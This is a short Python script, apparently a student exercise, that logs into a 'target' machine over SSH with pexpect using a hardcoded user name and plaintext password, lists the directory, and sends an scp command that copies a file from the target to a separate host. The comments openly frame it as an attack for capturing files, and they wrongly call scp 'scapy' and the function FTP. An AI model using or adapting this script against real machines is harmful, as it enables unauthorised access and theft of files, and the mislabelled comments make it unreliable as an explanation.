from pexpect import pxssh

# The user name of the target.
userName = 'samuel';
# The ip adress of the target.
hostName = '127.0.0.1'
# The password of the target.
password = '26029823O3d'
# The port 22 is the port of the SSH.
port = 22

# The path of the file we want to capture in the computer of the target.
# Here, we assume that the file is in the Desktop, but he could be in other place, then, if the path of the file is unknow
# We can use ls which return a list of all the directory of the target computer.
# To go deeper here his a idea of use of the FTP function :
# Since the shell of the target is open, we can let the user do his own input of the target's shell, and from here the attack his define by the user and not predefine by the coder.
hostPath = 'cd Desktop' # We can use a detector of file

# The name of the file we want to capture.
fileName = 'random.c'
# The path where we want to get the captured file.
path = '/home/samuel/'

# The command line to input in the target shell (use of scapy).
commandLine = 'scp ' + fileName + ' ' + 'samuel' + '@' + '172.20.10.5' + ':' + path

# Assuming we got all the following elements : username, password, hostname, and the port 22 open, this function is able to capture a file from the target computer.
# To do this, the function sendline allow us to write a conmmand line in the shell of the target.
# Then we use scapy in a command line to send the desired file.
def FTP():
    try:
        s = pxssh.pxssh()
        s.login(hostName, userName, password)
        s.sendline('ls') 
        print(s.before)  
        s.prompt()  
        s.sendline(commandLine) 
        print(s.before)  
        s.prompt()
        s.sendline('26029823O3d') 
        print(s.before)  
        s.prompt()  
    except pxssh.ExceptionPxssh as e:
        print("pxssh failed on login.")
        print(e)

FTP()

